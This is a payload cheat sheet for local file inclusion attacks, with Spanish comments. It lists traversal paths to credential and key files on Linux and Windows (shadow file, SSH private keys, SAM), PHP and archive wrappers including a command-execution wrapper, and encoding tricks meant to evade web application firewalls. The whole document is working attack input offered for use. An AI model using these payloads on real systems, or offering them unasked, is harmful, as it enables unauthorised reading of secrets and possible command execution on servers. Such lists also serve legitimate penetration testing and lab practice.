# lfi_payloads

---

# ======================================================
# LFI (LOCAL FILE INCLUSION) PAYLOADS + OFUSCACIÓN
# ======================================================

# ----- PATHS COMUNES (Linux) -----
../../../../etc/passwd
../../../../etc/shadow
../../../../etc/hosts
../../../../var/log/apache2/access.log
../../../../var/log/nginx/access.log
../../../../proc/self/environ
../../../../proc/self/cmdline
../../../../var/www/html/config.php
../../../../home/*/.ssh/id_rsa

# ----- PATHS COMUNES (Windows) -----
..\..\..\Windows\win.ini
..\..\..\Windows\System32\drivers\etc\hosts
..\..\..\Windows\System32\config\SAM

# ----- PHP WRAPPERS -----
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=config.php
php://filter/convert.iconv.utf-8.utf-16/resource=flag.txt
php://input (requiere POST data)
expect://id

# ----- COMPRESSION WRAPPERS -----
zip://archive.zip%23file.txt
phar://archive.phar/file.txt

# ----- OFUSCACIÓN PARA WAF / BYPASS -----
# Doble codificación URL
..%252f..%252f..%252fetc%252fpasswd
..%2525%32%66..%2525%32%66..%2525%32%66etc%2525%32%66passwd

# Uso de ..; (en servidores Windows IIS)
..;..;..;..;Windows\win.ini

# Null byte injection (obsoleto pero a veces funciona)
../../../../etc/passwd%00
../../../../etc/passwd%00.jpg

# Uso de ./. para romper patrones
....//....//....//....//etc/passwd
..././..././..././etc/passwd

# Añadir parámetros extras para bypass de extensiones
../../../../etc/passwd?asd=asd
../../../../etc/passwd#asd

# Uso de codificación en base64 (con wrapper php)
php://filter/convert.base64-decode|convert.base64-decode/resource=file

# Fragmentación de path
/..\..\..\..\etc/passwd
\..\..\..\..\etc/passwd

# Mezcla de slash inversos y normales
..\..\..\..//etc//passwd

